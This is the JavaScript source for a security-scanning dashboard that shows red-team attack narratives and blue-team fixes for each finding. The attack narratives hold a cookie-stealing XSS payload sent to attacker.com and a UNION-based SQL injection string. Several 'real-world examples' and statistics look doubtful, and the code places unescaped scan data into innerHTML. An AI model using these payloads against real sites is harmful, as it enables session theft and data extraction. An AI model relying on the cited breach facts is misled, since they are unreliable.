// DevXploit Dashboard JavaScript
class DevXploitDashboard {
    constructor() {
        this.currentScanId = null;
        this.scanInterval = null;
        this.zapAvailable = false;
        this.initializeEventListeners();
        this.initializeLucideIcons();
        this.checkZAPStatus();
    }

    async checkZAPStatus() {
        try {
            const response = await fetch('/api/zap-status');
            const zapStatus = await response.json();
            this.zapAvailable = zapStatus.available;
            this.updateZAPStatusUI(zapStatus);
        } catch (error) {
            console.error('Error checking ZAP status:', error);
            this.zapAvailable = false;
        }
    }

    updateZAPStatusUI(zapStatus) {
        const activeScanToggle = document.getElementById('activeScanToggle');
        const urlHint = document.getElementById('urlHint');
        
        if (zapStatus.available) {
            // ZAP is available - enable active scanning
            if (urlHint) {
                urlHint.innerHTML = `
                    <span class="inline-flex items-center gap-1">
                        <i data-lucide="shield-check" class="w-3 h-3 text-emerald-400"></i>
                        OWASP ZAP ready for active scanning
                    </span>
                `;
            }
        } else {
            // ZAP not available - show warning
            if (urlHint) {
                urlHint.innerHTML = `
                    <span class="inline-flex items-center gap-1">
                        <i data-lucide="alert-triangle" class="w-3 h-3 text-amber-400"></i>
                        Active scan requires OWASP ZAP (passive mode available)
                    </span>
                `;
            }
        }
        
        // Re-initialize icons after DOM update
        if (typeof lucide !== 'undefined') {
            lucide.createIcons();
        }
    }

    initializeEventListeners() {
        // Scan button click
        const scanBtn = document.getElementById('scanBtn');
        if (scanBtn) {
            scanBtn.addEventListener('click', () => this.startScan());
        }

        // Active scan toggle
        const activeScanToggle = document.getElementById('activeScanToggle');
        const activeScanKnob = document.getElementById('activeScanKnob');
        if (activeScanToggle && activeScanKnob) {
            activeScanToggle.addEventListener('change', (e) => {
                if (e.target.checked) {
                    activeScanKnob.style.transform = 'translateX(20px)';
                    activeScanKnob.style.backgroundColor = '#06b6d4';
                } else {
                    activeScanKnob.style.transform = 'translateX(4px)';
                    activeScanKnob.style.backgroundColor = '#9ca3af';
                }
            });
        }

        // URL input enter key
        const targetUrl = document.getElementById('targetUrl');
        if (targetUrl) {
            targetUrl.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    this.startScan();
                }
            });
        }

        // Kill chain node clicks
        this.initializeKillChainInteraction();
    }

    initializeLucideIcons() {
        // Initialize Lucide icons
        if (typeof lucide !== 'undefined') {
            lucide.createIcons();
        }
    }

    async startScan() {
        const targetUrl = document.getElementById('targetUrl').value.trim();
        const activeScan = document.getElementById('activeScanToggle').checked;

        if (!targetUrl) {
            this.showNotification('Please enter a URL to scan', 'error');
            return;
        }

        // Validate URL format
        try {
            new URL(targetUrl);
        } catch (error) {
            this.showNotification('Please enter a valid URL (include http:// or https://)', 'error');
            return;
        }

        // Warn if active scan is enabled but ZAP is not available
        if (activeScan && !this.zapAvailable) {
            this.showNotification('Active scan enabled but OWASP ZAP is not running. Using basic checks only.', 'info');
        }

        try {
            // Start the scan
            const response = await fetch('/api/scan', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ 
                    url: targetUrl, 
                    scanType: activeScan ? 'comprehensive' : 'basic'
                })
            });

            const result = await response.json();

            if (response.ok) {
                this.currentScanId = result.scanId;
                this.showDashboardView(targetUrl);
                this.startScanPolling();
                
                const scanType = activeScan ? 'Active security scan' : 'Passive security scan';
                this.showNotification(`${scanType} started successfully`, 'success');
            } else {
                this.showNotification(result.error || 'Failed to start scan', 'error');
            }
        } catch (error) {
            console.error('Scan error:', error);
            this.showNotification('Network error occurred', 'error');
        }
    }

    showDashboardView(url) {
        // Hide home view and show dashboard view
        const homeView = document.getElementById('homeView');
        const dashboardView = document.getElementById('dashboardView');
        
        if (homeView) homeView.style.display = 'none';
        if (dashboardView) dashboardView.classList.remove('hidden');

        // Update target display
        const targetDisplay = document.getElementById('targetDisplay');
        if (targetDisplay) {
            targetDisplay.textContent = url;
        }

        // Reset progress
        this.updateProgress(0, 'Initializing scan...');
    }

    startScanPolling() {
        if (this.scanInterval) {
            clearInterval(this.scanInterval);
        }

        this.scanInterval = setInterval(async () => {
            await this.checkScanStatus();
        }, 2000); // Poll every 2 seconds
    }

    async checkScanStatus() {
        if (!this.currentScanId) return;

        try {
            console.log(`Checking scan status for: ${this.currentScanId}`);
            const response = await fetch(`/api/scan/${this.currentScanId}`);
            const scanData = await response.json();

            console.log('Scan data received:', scanData);

            if (response.ok) {
                this.updateProgress(scanData.progress, scanData.currentPhase);
                
                if (scanData.status === 'completed') {
                    console.log('Scan completed, displaying results:', scanData.results);
                    clearInterval(this.scanInterval);
                    this.displayResults(scanData.results);
                    this.showNotification('Scan completed successfully', 'success');
                } else if (scanData.status === 'failed') {
                    console.log('Scan failed:', scanData.error);
                    clearInterval(this.scanInterval);
                    this.showNotification(`Scan failed: ${scanData.error}`, 'error');
                }
            } else {
                console.error('Error response:', response.status, scanData);
            }
        } catch (error) {
            console.error('Error checking scan status:', error);
        }
    }

    updateProgress(progress, phase) {
        const progressBar = document.getElementById('scanProgressBar');
        const progressText = document.getElementById('scanProgressText');
        
        if (progressBar) {
            progressBar.style.width = `${progress}%`;
        }
        
        if (progressText && phase) {
            progressText.textContent = phase;
        }
    }

    displayResults(results) {
        console.log('🎯 Displaying results:', results);
        
        // Update kill chain visualization
        this.updateKillChain(results.aiAnalysis?.killChainSteps);
        
        // Display vulnerability summary
        this.displayVulnerabilitySummary(results.vulnerabilities);
        
        // Display ZAP-specific results if available
        if (results.zapScan) {
            this.displayZAPResults(results.zapScan);
        }
        
        // Display AI narratives with red/blue team functionality
        this.displayAINarratives(results.aiAnalysis);
        
        // Update security score (this is the main fix)
        if (results.vulnerabilities && results.vulnerabilities.severity) {
            console.log('📊 Updating security score with:', results.vulnerabilities.severity);
            this.updateSecurityScore(results.vulnerabilities.severity);
            
            // Add event to show score calculation
            const score = results.vulnerabilities.severity.score;
            const grade = results.vulnerabilities.severity.grade;
            const totalVulns = results.vulnerabilities.severity.totalVulnerabilities;
            
            this.addRealTimeEvent('calculator', 'text-blue-400', 
                `Security score calculated: ${score}/100 (${grade}) based on ${totalVulns} findings`);
        }
        
        // Initialize red/blue team tabs
        this.initializeRedBlueTeamTabs();
        
        // Show AI analysis section if we have AI data
        if (results.aiAnalysis) {
            console.log('📊 Showing AI analysis section');
            const aiSection = document.getElementById('aiAnalysisSection');
            if (aiSection) {
                aiSection.style.display = 'block';
            } else {
                console.error('❌ AI analysis section not found in DOM');
            }
        }
        
        console.log('✅ Results display complete');
    }

    addRealTimeEvent(icon, color, text) {
        const eventsFeed = document.getElementById('eventsFeed');
        if (!eventsFeed) return;

        const item = document.createElement('div');
        item.className = 'flex items-start gap-3 rounded-lg border border-zinc-800 bg-zinc-950/60 p-3';
        item.innerHTML = `
          <span class="inline-flex h-7 w-7 items-center justify-center rounded-md bg-zinc-900 ring-1 ring-zinc-800">
            <i data-lucide="${icon}" class="h-4 w-4 ${color}" style="stroke-width:1.5"></i>
          </span>
          <p class="text-sm text-zinc-300">${text}</p>
        `;
        eventsFeed.prepend(item);
        
        // Re-initialize icons
        if (typeof lucide !== 'undefined') {
            lucide.createIcons({ attrs: { "stroke-width": 1.5 } });
        }
    }

    displayZAPResults(zapScan) {
        if (zapScan.error) {
            this.showNotification(`ZAP Scan Issue: ${zapScan.message}`, 'info');
            return;
        }

        if (zapScan.zapAvailable && zapScan.vulnerabilities.length > 0) {
            this.showNotification(`OWASP ZAP found ${zapScan.vulnerabilities.length} additional vulnerabilities`, 'info');
            
            // Display ZAP-specific stats
            const zapInfo = document.getElementById('zapInfo');
            if (zapInfo) {
                zapInfo.innerHTML = `
                    <div class="mt-4 p-3 rounded-lg bg-emerald-900/20 border border-emerald-700/30">
                        <div class="flex items-center gap-2">
                            <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i>
                            <span class="text-sm font-medium text-emerald-300">OWASP ZAP Integration</span>
                        </div>
                        <div class="mt-2 text-xs text-emerald-400">
                            Found ${zapScan.vulnerabilities.length} vulnerabilities using professional-grade scanning
                        </div>
                    </div>
                `;
                lucide.createIcons();
            }
        }
    }

    updateKillChain(killChainSteps) {
        if (!killChainSteps) return;

        const svg = document.getElementById('killChainSvg');
        if (!svg) return;

        killChainSteps.forEach(step => {
            const node = svg.querySelector(`[data-phase="${step.phase}"]`);
            if (node) {
                const circle = node.querySelector('circle:last-child');
                const icon = node.querySelector('foreignObject i');
                
                if (step.status === 'completed') {
                    circle.setAttribute('stroke', '#06b6d4');
                    circle.setAttribute('stroke-width', '3');
                    circle.style.strokeOpacity = '0.6';
                    if (icon) icon.style.color = '#06b6d4';
                } else if (step.status === 'possible') {
                    circle.setAttribute('stroke', '#f59e0b');
                    circle.setAttribute('stroke-width', '2');
                    circle.style.strokeOpacity = '0.8';
                    if (icon) icon.style.color = '#f59e0b';
                }
            }
        });
    }

    displayVulnerabilitySummary(vulnerabilities) {
        if (!vulnerabilities) return;

        const summary = document.getElementById('vulnerabilitySummary');
        if (summary) {
            const { totalFound, severity } = vulnerabilities;
            summary.innerHTML = `
                <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div class="text-center">
                        <div class="text-2xl font-bold text-red-400">${severity.criticalCount || 0}</div>
                        <div class="text-xs text-zinc-400">Critical</div>
                    </div>
                    <div class="text-center">
                        <div class="text-2xl font-bold text-orange-400">${severity.highCount || 0}</div>
                        <div class="text-xs text-zinc-400">High</div>
                    </div>
                    <div class="text-center">
                        <div class="text-2xl font-bold text-yellow-400">${severity.mediumCount || 0}</div>
                        <div class="text-xs text-zinc-400">Medium</div>
                    </div>
                    <div class="text-center">
                        <div class="text-2xl font-bold text-blue-400">${severity.lowCount || 0}</div>
                        <div class="text-xs text-zinc-400">Low</div>
                    </div>
                </div>
            `;
        }

        // Also display detailed vulnerability list
        this.displayDetailedVulnerabilities(vulnerabilities);
    }

    displayDetailedVulnerabilities(vulnerabilities) {
        if (!vulnerabilities) return;

        const findingsList = document.getElementById('findingsList');
        if (!findingsList) return;

        const vulnList = vulnerabilities.vulnerabilities || [];
        
        if (vulnList.length === 0) {
            findingsList.innerHTML = `
                <div class="p-6 text-center">
                    <div class="flex items-center justify-center w-12 h-12 mx-auto mb-4 rounded-full bg-emerald-900/20">
                        <i data-lucide="shield-check" class="w-6 h-6 text-emerald-400"></i>
                    </div>
                    <h3 class="text-sm font-medium text-zinc-300 mb-1">No Vulnerabilities Found</h3>
                    <p class="text-xs text-zinc-500">This scan detected no security issues. Keep monitoring regularly.</p>
                </div>
            `;
            lucide.createIcons();
            return;
        }

        // Store vulnerabilities for team perspective switching
        this.currentVulnerabilities = vulnList;
        this.renderVulnerabilitiesForCurrentTeam();
    }

    renderVulnerabilitiesForCurrentTeam() {
        const findingsList = document.getElementById('findingsList');
        if (!findingsList || !this.currentVulnerabilities) return;

        // Determine current team perspective
        const redTeamTab = document.getElementById('redTeamTab');
        const isRedTeam = redTeamTab && redTeamTab.className.includes('bg-red-500');

        const vulnHTML = this.currentVulnerabilities.map((vuln, index) => {
            return this.renderVulnerabilityCard(vuln, index, isRedTeam);
        }).join('');

        findingsList.innerHTML = vulnHTML;
        lucide.createIcons();
    }

    renderVulnerabilityCard(vuln, index, isRedTeam) {
        const severityConfig = {
            'Critical': { 
                color: 'text-red-400 bg-red-900/20 border-red-800', 
                icon: 'alert-triangle',
                bgClass: 'bg-red-500/5 border-red-500/20'
            },
            'High': { 
                color: 'text-orange-400 bg-orange-900/20 border-orange-800', 
                icon: 'zap',
                bgClass: 'bg-orange-500/5 border-orange-500/20'
            }, 
            'Medium': { 
                color: 'text-yellow-400 bg-yellow-900/20 border-yellow-800', 
                icon: 'info',
                bgClass: 'bg-yellow-500/5 border-yellow-500/20'
            },
            'Low': { 
                color: 'text-blue-400 bg-blue-900/20 border-blue-800', 
                icon: 'eye',
                bgClass: 'bg-blue-500/5 border-blue-500/20'
            },
            'Info': { 
                color: 'text-sky-400 bg-sky-900/20 border-sky-800', 
                icon: 'info',
                bgClass: 'bg-sky-500/5 border-sky-500/20'
            }
        };

        const config = severityConfig[vuln.severity] || severityConfig['Info'];

        // Generate team-specific content
        const perspectiveContent = isRedTeam ? 
            this.generateRedTeamPerspective(vuln) : 
            this.generateBlueTeamPerspective(vuln);

        return `
            <div class="p-5 hover:bg-zinc-900/30 transition-colors border-l-2 ${isRedTeam ? 'border-red-500/30' : 'border-blue-500/30'}">
                <div class="flex items-start gap-4">
                    <!-- Severity Indicator -->
                    <div class="flex-shrink-0">
                        <div class="flex items-center justify-center w-10 h-10 rounded-lg ${config.bgClass} border">
                            <i data-lucide="${config.icon}" class="w-5 h-5 ${config.color.split(' ')[0]}" style="stroke-width:1.5"></i>
                        </div>
                    </div>

                    <!-- Vulnerability Details -->
                    <div class="flex-1 min-w-0">
                        <div class="flex items-start justify-between mb-2">
                            <h3 class="text-base font-semibold text-zinc-200 leading-tight">${vuln.type}</h3>
                            <div class="flex items-center gap-2">
                                <span class="inline-flex items-center px-2 py-1 text-xs font-medium rounded-md border ${config.color}">
                                    ${vuln.severity}
                                </span>
                                <span class="inline-flex items-center px-2 py-1 text-xs rounded-md ${isRedTeam ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-blue-500/10 text-blue-400 border border-blue-500/20'}">
                                    <i data-lucide="${isRedTeam ? 'sword' : 'shield'}" class="w-3 h-3 mr-1" style="stroke-width:1.5"></i>
                                    ${isRedTeam ? 'Attacker' : 'Defender'}
                                </span>
                            </div>
                        </div>
                        
                        <p class="text-sm text-zinc-400 mb-4 leading-relaxed">${vuln.description}</p>
                        
                        <!-- Team-Specific Perspective -->
                        ${perspectiveContent}
                        
                        <!-- Technical Details -->
                        <div class="space-y-3 mt-4">
                            <div class="rounded-lg bg-zinc-950/50 border border-zinc-800 p-3">
                                <div class="grid md:grid-cols-2 gap-3 text-sm">
                                    <div>
                                        <span class="text-zinc-500 font-medium">Location:</span>
                                        <div class="mt-1 text-zinc-300 font-mono text-xs bg-zinc-900/50 px-2 py-1 rounded border break-all">
                                            ${vuln.location || vuln.evidence || 'See evidence below'}
                                        </div>
                                    </div>
                                    <div>
                                        <span class="text-zinc-500 font-medium">Evidence:</span>
                                        <div class="mt-1 text-zinc-400 text-xs">
                                            ${vuln.evidence || 'Vulnerability detected during automated scanning'}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    generateRedTeamPerspective(vuln) {
        // Generate unique attack narratives based on specific vulnerability details
        let narrative = this.getUniqueAttackerPlan(vuln);
        
        return `
            <div class="rounded-lg bg-red-500/5 border border-red-500/20 p-4">
                <div class="flex items-start gap-3">
                    <i data-lucide="sword" class="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" style="stroke-width:1.5"></i>
                    <div class="flex-1">
                        <h4 class="text-red-400 font-semibold text-sm mb-2">Red Team Perspective</h4>
                        <div class="text-zinc-300 text-sm leading-relaxed whitespace-pre-line">${narrative}</div>
                        <div class="mt-3 p-3 bg-red-900/10 border border-red-800/30 rounded-md">
                            <p class="text-red-300 text-xs font-medium mb-1">Exploitation Potential:</p>
                            <p class="text-zinc-400 text-xs">${this.getExploitationPotential(vuln)}</p>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    getUniqueAttackerPlan(vuln) {
        const vulnType = vuln.type.toLowerCase();
        const location = vuln.location || 'the target application';
        const evidence = vuln.evidence || '';
        
        // Generate specific plans based on vulnerability type and context
        if (vulnType.includes('xss') || vulnType.includes('cross-site scripting')) {
            return `Attacker Plan for XSS at ${location}:

1. Target Discovery: The attacker notices this XSS vulnerability in the web form or parameter. Like a thief finding an unlocked window, they see an entry point into user sessions.

2. Payload Development: They craft malicious JavaScript code. For example, a simple script that steals cookies: document.location='http://attacker.com/steal.php?cookie='+document.cookie

3. Delivery Method: The attacker tricks users to click a malicious link or submits the payload through the vulnerable form. Similar to how phishing emails work, but through the website itself.

4. Session Hijacking: When a victim views the malicious content, their session cookie gets sent to the attacker. This is like stealing someone's house key while they are visiting.

5. Account Takeover: With the stolen session, the attacker can impersonate the victim, access their account, and perform actions as if they were the legitimate user.

Real-world example: In 2018, British Airways suffered an XSS attack where attackers injected malicious code that skimmed credit card details from 380,000 customers during checkout.`;
        }
        
        if (vulnType.includes('sql injection')) {
            return `Attacker Plan for SQL Injection at ${location}:

1. Database Probing: The attacker tests input fields with special characters like single quotes to see if they get database errors. Think of it like trying different keys to see which one opens a lock.

2. Information Gathering: They use SQL commands to discover database structure, table names, and column details. Similar to a burglar studying a building's layout before breaking in.

3. Data Extraction: The attacker crafts SQL queries to dump sensitive data like usernames, passwords, and personal information. For example: ' UNION SELECT username,password FROM users--

4. Privilege Escalation: They attempt to gain administrative database access using functions like xp_cmdshell in SQL Server or load_file in MySQL.

5. System Compromise: With database admin rights, they can read files, write backdoors, or even execute system commands on the server.

Real-world example: The 2017 Equifax breach exposed 147 million people's data through SQL injection, including Social Security numbers and credit card information.`;
        }
        
        if (vulnType.includes('missing') && vulnType.includes('header')) {
            const headerName = evidence.match(/Header '([^']+)'/)?.[1] || 'security header';
            return `Attacker Plan for Missing ${headerName} at ${location}:

1. Header Analysis: The attacker uses tools like curl or browser developer tools to check what security headers are missing. Like checking if a house has security cameras or alarm systems.

2. Attack Vector Selection: Based on the missing header, they choose the right attack. No X-Frame-Options means clickjacking is possible, no CSP means XSS attacks are easier.

3. Malicious Site Creation: They create a fake website that exploits the missing protection. For example, embedding the target site in an invisible iframe for clickjacking.

4. Social Engineering: The attacker tricks users into visiting their malicious site through phishing emails or fake advertisements.

5. Exploitation: When users interact with the malicious site, the missing security headers allow the attack to succeed, potentially stealing data or performing unauthorized actions.

Real-world example: Many banking websites have been targeted by clickjacking attacks where missing X-Frame-Options headers allowed attackers to overlay invisible buttons over legitimate banking functions.`;
        }
        
        if (vulnType.includes('form') && vulnType.includes('security')) {
            return `Attacker Plan for Form Security Issues at ${location}:

1. Form Analysis: The attacker examines all forms on the website to understand how data is processed. Like a con artist studying their mark's routines and weaknesses.

2. CSRF Token Bypass: If forms lack CSRF protection, they create malicious websites that automatically submit forms when victims visit. The victim's browser unwittingly sends authenticated requests.

3. Input Validation Testing: They test various malicious inputs to see what gets through. Think of it like testing different fake IDs to see which one works.

4. Session Management Exploitation: If forms use GET methods for sensitive data, the attacker can steal information from browser history, referrer headers, or server logs.

5. Business Logic Abuse: They manipulate form submissions to bypass intended workflows, like changing prices in shopping carts or accessing unauthorized features.

Real-world example: Many e-commerce sites have been exploited through form manipulation, allowing attackers to purchase expensive items for pennies by modifying hidden price fields.`;
        }
        
        // Default plan for other vulnerability types
        return `Attacker Plan for ${vuln.type} at ${location}:

1. Vulnerability Assessment: The attacker identifies this specific security weakness and studies how it can be exploited. Like a thief examining a weak lock or broken window.

2. Tool Preparation: They gather appropriate exploitation tools and techniques specific to this vulnerability type. Each vulnerability requires different methods and approaches.

3. Attack Execution: The attacker systematically exploits the vulnerability using proven techniques. They often start with simple tests and gradually increase complexity.

4. Impact Assessment: They determine what data or systems can be accessed through this vulnerability. The goal is to understand the full scope of potential damage.

5. Persistence and Expansion: If successful, they try to maintain access and use this vulnerability as a stepping stone to find additional weaknesses in the system.

This type of vulnerability commonly leads to unauthorized access, data theft, or system compromise depending on the specific implementation and context.`;
    }

    generateBlueTeamPerspective(vuln) {
        // Generate unique defense strategies based on specific vulnerability details
        let strategy = this.getUniqueDefenderPlan(vuln);

        return `
            <div class="rounded-lg bg-blue-500/5 border border-blue-500/20 p-4">
                <div class="flex items-start gap-3">
                    <i data-lucide="shield" class="w-5 h-5 text-blue-400 flex-shrink-0 mt-0.5" style="stroke-width:1.5"></i>
                    <div class="flex-1">
                        <h4 class="text-blue-400 font-semibold text-sm mb-2">Blue Team Perspective</h4>
                        <div class="text-zinc-300 text-sm leading-relaxed whitespace-pre-line">${strategy}</div>
                        <div class="mt-3 p-3 bg-emerald-900/10 border border-emerald-800/30 rounded-md">
                            <p class="text-emerald-300 text-xs font-medium mb-1">Remediation Steps:</p>
                            <p class="text-zinc-400 text-xs">${vuln.remediation || vuln.recommendation || 'Follow security best practices for this vulnerability type'}</p>
                        </div>
                        ${this.generateCodeExample(vuln)}
                    </div>
                </div>
            </div>
        `;
    }

    getUniqueDefenderPlan(vuln) {
        const vulnType = vuln.type.toLowerCase();
        const location = vuln.location || 'the affected component';
        const evidence = vuln.evidence || '';
        
        // Generate specific defense strategies based on vulnerability type and context
        if (vulnType.includes('xss') || vulnType.includes('cross-site scripting')) {
            return `Developer Defense Plan for XSS at ${location}:

1. Input Validation: Set up strict input validation that only allows expected characters. Think of it like having a bouncer at a club who checks IDs and only lets in approved guests.

2. Output Encoding: Always encode user data before displaying it in HTML. This is like putting dangerous chemicals in safe containers before handling them.

3. Content Security Policy: Implement CSP headers that block inline scripts and only allow scripts from trusted sources. Similar to having a whitelist of approved visitors for a secure building.

4. Framework Protection: Use modern web frameworks like React or Angular that automatically escape user input. This is like using a car with built-in safety features instead of building your own.

5. Regular Testing: Set up automated security tests in your development pipeline. Just like having regular fire drills, you want to catch problems before they become emergencies.

Real-world example: After the 2018 British Airways attack, they implemented strict CSP headers and input validation that now blocks similar XSS attempts automatically.`;
        }
        
        if (vulnType.includes('sql injection')) {
            return `Developer Defense Plan for SQL Injection at ${location}:

1. Prepared Statements: Replace all dynamic SQL queries with parameterized queries. This separates code from data, like having separate lanes for cars and pedestrians.

2. Input Validation: Validate and sanitize all user inputs before they reach the database. Think of it as having a security checkpoint that inspects everything coming in.

3. Database Permissions: Use database accounts with minimal required permissions. Like giving employees access cards that only work for areas they need to access.

4. Error Handling: Replace detailed database error messages with generic ones. Instead of telling attackers exactly what went wrong, show them a simple error page.

5. Web Application Firewall: Deploy a WAF to filter malicious requests before they reach your application. This acts like a security guard who checks visitors before they enter the building.

Real-world example: After the Equifax breach, many companies implemented mandatory code reviews and automated SQL injection testing that catches 99% of these vulnerabilities before deployment.`;
        }
        
        if (vulnType.includes('missing') && vulnType.includes('header')) {
            const headerName = evidence.match(/Header '([^']+)'/)?.[1] || 'security header';
            return `Developer Defense Plan for Missing ${headerName} at ${location}:

1. Header Implementation: Add the missing security header to your web server or application configuration. This is like installing a missing security feature on your building.

2. Configuration Review: Check all your web servers and load balancers to ensure consistent security header deployment. Make sure every entry point has the same protection.

3. Testing and Monitoring: Use tools like securityheaders.com to regularly test your headers. Set up monitoring alerts if headers are accidentally removed during deployments.

4. Content Security Policy: If missing CSP, start with a report-only policy to understand your application's requirements, then gradually tighten restrictions.

5. HTTPS Enforcement: If missing HSTS, implement HTTP Strict Transport Security to force all connections over secure HTTPS. This prevents downgrade attacks.

Real-world example: Major banks now use comprehensive security headers that have reduced clickjacking attacks by over 95% since implementation.`;
        }
        
        if (vulnType.includes('form') && vulnType.includes('security')) {
            return `Developer Defense Plan for Form Security Issues at ${location}:

1. CSRF Protection: Implement anti-CSRF tokens for all state-changing operations. Each form gets a unique token that must be validated on submission, like requiring a secret handshake.

2. Server-Side Validation: Never trust client-side validation alone. Always re-validate everything on the server, like double-checking documents even if they were pre-approved.

3. HTTPS Only: Ensure all forms submit over HTTPS, especially those handling sensitive data. This encrypts the data in transit like sending documents in a locked briefcase.

4. Rate Limiting: Implement submission limits to prevent automated abuse. Like having a "one transaction per minute" rule to stop bulk fraudulent activity.

5. Input Sanitization: Clean and validate all form inputs on the server side. Remove or escape any potentially dangerous characters before processing.

Real-world example: E-commerce sites that implemented CSRF tokens and server-side validation saw a 90% reduction in fraudulent transactions and form manipulation attacks.`;
        }
        
        // Default plan for other vulnerability types
        return `Developer Defense Plan for ${vuln.type} at ${location}:

1. Immediate Assessment: Evaluate the scope and impact of this vulnerability in your codebase. Check if similar issues exist in other parts of your application.

2. Priority Patching: Address this vulnerability based on its severity level. Critical and high-severity issues should be fixed within days, not weeks.

3. Code Review: Conduct thorough reviews of similar code patterns throughout your application. Often vulnerabilities appear in multiple places.

4. Security Testing: Implement automated security testing in your development pipeline to catch similar issues early. Prevention is always better than reactive fixes.

5. Team Training: Ensure your development team understands this vulnerability type and how to prevent it in future code. Knowledge sharing prevents recurring issues.

This type of vulnerability requires careful attention to secure coding practices and regular security assessments to prevent recurrence.`;
    }

    getExploitationPotential(vuln) {
        const potentials = {
            'Critical': 'Immediate system compromise possible. Attackers can gain unauthorized access to sensitive data or execute arbitrary code.',
            'High': 'Significant security risk. Can lead to data breaches, account takeovers, or system manipulation.',
            'Medium': 'Moderate risk with potential for information disclosure or limited system access.',
            'Low': 'Lower impact but can be chained with other vulnerabilities for greater effect.',
            'Info': 'Information gathering potential that aids in planning more sophisticated attacks.'
        };
        return potentials[vuln.severity] || potentials['Medium'];
    }

    generateCodeExample(vuln) {
        const codeExamples = {
            'XSS': `<pre class="mt-3 text-xs bg-zinc-950/50 border border-zinc-800 rounded p-2 text-zinc-300 overflow-x-auto"><code>// Secure Implementation Example
// BEFORE (Vulnerable)
response.write("&lt;div&gt;" + userInput + "&lt;/div&gt;");

// AFTER (Secure)
response.write("&lt;div&gt;" + escapeHtml(userInput) + "&lt;/div&gt;");</code></pre>`,
            'SQL Injection': `<pre class="mt-3 text-xs bg-zinc-950/50 border border-zinc-800 rounded p-2 text-zinc-300 overflow-x-auto"><code>// Secure Implementation Example
// BEFORE (Vulnerable)
"SELECT * FROM users WHERE id = " + userId

// AFTER (Secure - Prepared Statement)
"SELECT * FROM users WHERE id = ?"
with parameter: userId</code></pre>`,
            'Missing Security Header': `<pre class="mt-3 text-xs bg-zinc-950/50 border border-zinc-800 rounded p-2 text-zinc-300 overflow-x-auto"><code>// Security Headers Configuration
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre>`
        };

        for (const [vulnType, code] of Object.entries(codeExamples)) {
            if (vuln.type.toLowerCase().includes(vulnType.toLowerCase())) {
                return code;
            }
        }
        return '';
    }

    displayAINarratives(aiAnalysis) {
        if (!aiAnalysis) return;

        const attackerNarrative = document.getElementById('attackerNarrative');
        const defenseRemediation = document.getElementById('defenseRemediation');

        if (attackerNarrative && aiAnalysis.attackerNarrative) {
            attackerNarrative.innerHTML = this.formatNarrative(aiAnalysis.attackerNarrative);
        }

        if (defenseRemediation && aiAnalysis.developerRemediation) {
            defenseRemediation.innerHTML = this.formatNarrative(aiAnalysis.developerRemediation);
        }
    }

    initializeRedBlueTeamTabs() {
        const redTeamTab = document.getElementById('redTeamTab');
        const blueTeamTab = document.getElementById('blueTeamTab');
        const redTeamContent = document.getElementById('redTeamContent');
        const blueTeamContent = document.getElementById('blueTeamContent');

        if (!redTeamTab || !blueTeamTab || !redTeamContent || !blueTeamContent) return;

        // Default to red team view
        this.switchToRedTeam();

        redTeamTab.addEventListener('click', () => {
            this.switchToRedTeam();
        });

        blueTeamTab.addEventListener('click', () => {
            this.switchToBlueTeam();
        });
    }

    switchToRedTeam() {
        const redTeamTab = document.getElementById('redTeamTab');
        const blueTeamTab = document.getElementById('blueTeamTab');
        const redTeamContent = document.getElementById('redTeamContent');
        const blueTeamContent = document.getElementById('blueTeamContent');

        // Update tab appearance
        if (redTeamTab) {
            redTeamTab.className = 'inline-flex items-center gap-2 rounded-md px-3 py-2 text-sm font-medium transition bg-red-500/10 text-red-400 ring-1 ring-red-500/20';
        }
        if (blueTeamTab) {
            blueTeamTab.className = 'inline-flex items-center gap-2 rounded-md px-3 py-2 text-sm font-medium transition text-zinc-400 hover:text-zinc-300 hover:bg-zinc-800/50';
        }

        // Update content visibility
        if (redTeamContent) redTeamContent.style.display = 'block';
        if (blueTeamContent) blueTeamContent.style.display = 'none';

        // Re-render vulnerabilities with red team perspective
        this.renderVulnerabilitiesForCurrentTeam();
    }

    switchToBlueTeam() {
        const redTeamTab = document.getElementById('redTeamTab');
        const blueTeamTab = document.getElementById('blueTeamTab');
        const redTeamContent = document.getElementById('redTeamContent');
        const blueTeamContent = document.getElementById('blueTeamContent');

        // Update tab appearance
        if (blueTeamTab) {
            blueTeamTab.className = 'inline-flex items-center gap-2 rounded-md px-3 py-2 text-sm font-medium transition bg-blue-500/10 text-blue-400 ring-1 ring-blue-500/20';
        }
        if (redTeamTab) {
            redTeamTab.className = 'inline-flex items-center gap-2 rounded-md px-3 py-2 text-sm font-medium transition text-zinc-400 hover:text-zinc-300 hover:bg-zinc-800/50';
        }

        // Update content visibility
        if (redTeamContent) redTeamContent.style.display = 'none';
        if (blueTeamContent) blueTeamContent.style.display = 'block';

        // Re-render vulnerabilities with blue team perspective
        this.renderVulnerabilitiesForCurrentTeam();
    }

    formatNarrative(text) {
        // Convert markdown-like formatting to HTML
        return text
            .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
            .replace(/\*(.*?)\*/g, '<em>$1</em>')
            .replace(/`(.*?)`/g, '<code class="bg-zinc-800 px-1 py-0.5 rounded text-sm">$1</code>')
            .replace(/\n\n/g, '</p><p class="mt-3">')
            .replace(/^/, '<p>')
            .replace(/$/, '</p>');
    }

    updateSecurityScore(severity) {
        if (!severity) return;

        // Update the main score display
        const scoreLabel = document.getElementById('scoreLabel');
        const scoreState = document.getElementById('scoreState');
        
        if (scoreLabel) {
            scoreLabel.textContent = severity.score || 100;
        }
        
        if (scoreState) {
            scoreState.textContent = severity.grade || 'Excellent';
        }

        // Update the doughnut chart
        const scoreChart = window.scoreChart;
        if (scoreChart) {
            const score = severity.score || 100;
            scoreChart.data.datasets[0].data = [score, 100 - score];
            scoreChart.update();
        }

        // Update vulnerability counts in the sidebar
        const countElements = {
            'countCritical': severity.criticalCount || 0,
            'countHigh': severity.highCount || 0,
            'countMedium': severity.mediumCount || 0,
            'countLow': severity.lowCount || 0,
            'countInfo': severity.infoCount || 0
        };

